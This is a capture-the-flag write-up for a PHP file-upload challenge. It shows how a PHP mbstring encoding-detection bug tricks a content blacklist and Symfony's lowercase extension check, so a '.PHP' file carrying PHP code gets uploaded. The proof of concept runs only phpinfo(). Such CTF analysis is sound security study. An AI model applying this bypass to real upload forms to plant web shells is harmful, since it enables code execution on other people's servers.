# easy_upload

## How to Setup Environment

`docker-compose up -d`

## Write Up

I found a funny issue when I have no idea about challenge.

https://github.com/php/php-src/issues/9008

It cause strange result.

```php
<?php
$string = "PHP";

mb_detect_order(["ASCII","UTF-8","BASE64"]);
var_dump(
    mb_detect_encoding($string, null, true),
    mb_detect_encoding($string, mb_detect_order(), true),
    
    mb_convert_encoding($string, "UTF-8", "BASE64"),
    mb_strtolower($string, "BASE64"),
);
```



```
Output for 8.2.0
string(5) "ASCII"
string(5) "ASCII"
string(2) "<s"
string(4) "PHM="

Output for 8.0.1 - 8.0.26, 8.1.10 - 8.1.13
string(5) "ASCII"
string(5) "ASCII"
string(2) "<s"
string(4) "PHM="

Output for 8.1.0 - 8.1.9
string(6) "BASE64"
string(5) "ASCII"
string(2) "<s"
string(4) "PHM="
```

I search it in github and  found that `Symfony\Component\Filesystem\Path::getExtension`  will call `mb_detect_encoding` when enable `$forceLowerCase` which means that it can bypass extension black list. Like following code:

```php
<?php
    $path = "webshell.PHP";
	$disable_ext = ["php"];
	$ext = Symfony\Component\Filesystem\Path::getExtension($path, true);
	if(in_array($ext, $disable_ext)){
        die("hack go away");
    }

```

`UploadController` has two limitations:
1. content check
2. extension check

### bypass content check

```php
$content = file_get_contents($file["tmp_name"]);
$charset = mb_detect_encoding($content, null, true);
if(false !== $charset){
    if($charset == "BASE64"){
        $content = base64_decode($content);
    }
    foreach ($this->content_blacklist as $v) {
        if(stristr($content, $v)!==false){
            return $this->invalid("fucking $v .");
        }
    }
}else{
    return $this->invalid("fucking invalid format.");
}
```
If we can cheat mb_detect_encoding recognize invalid BASE64 string as BASE64 then the check fails.

`mb_detect_encoding("\xffPHP<?php phpinfo();");` => BASE64
### bypass extension check

```php
$ext = Path::getExtension($file["name"], true);
if(strstr($file["name"], "..")!==false){
    return $this->$this->invalid("fucking path travel");
}
foreach ($this->ext_blacklist as $v){
    if (strstr($ext, $v) !== false){
        return $this->invalid("fucking $ext extension.");
    }
}
...
$result = move_uploaded_file($file["tmp_name"], "$dir/upload/".strtolower($file["name"]));
```
`Path::getExtension($file["name"], true)`, the second argument force the extionsion to be in lower case.
So using `PHP` extension seems not able to bypass blacklist. But actually it can.

Symfony use the following code to lower extension.
```php
private static function toLower(string $string): string
{
    if (false !== $encoding = mb_detect_encoding($string, null, true)) {
        return mb_strtolower($string, $encoding);
    }

    return strtolower($string);
}
```
`mb_detect_encoding("PHP", null, true)` => BASE64

`mb_strtolower("PHP", "BASE64")` => PHM=

## Exploit

test.PHP

```
\xff<?php phpinfo();
```

